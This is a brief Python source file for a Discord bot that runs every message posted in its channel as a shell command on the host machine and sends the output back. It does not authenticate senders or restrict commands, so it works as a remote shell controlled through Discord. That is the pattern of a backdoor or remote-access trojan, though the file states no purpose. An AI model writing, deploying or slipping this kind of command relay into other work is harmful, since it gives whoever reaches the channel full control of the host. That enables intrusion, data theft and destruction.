import shlex
import discord
import asyncio
import os
import subprocess


TOKEN = ''     # Replace with your bot's token
CHANNEL_ID = 1379950289569976330 # Replace with your channel ID
MESSAGE = 'Hey!'

intents = discord.Intents.all()
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

current_directory = os.getcwd()

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    
@client.event
async def on_message(message):
    global current_directory
    
    if message.author == client.user:
        return
    
    command = message.content.strip()

        
    if command.startswith("cd "):
        try:
            path = command[3:].strip().strip('"')
            os.chdir(path)
            current_directory = os.getcwd()
            
            await message.channel.send(f"Changed directory to:\n`{current_directory}`")
        
        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")
        
        return
        
    
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
        output = (result.stdout + result.stderr).strip()
        
        if not output:
            output = "(No output)"
    
        for i in range(0, len(output), 1990):
            chunk = output[i:i+1990]
            await message.channel.send(f"```{chunk}```")
            
    except Exception as e:
        await message.channel.send(f"❌ Execution error: {str(e)}")
    
client.run(TOKEN)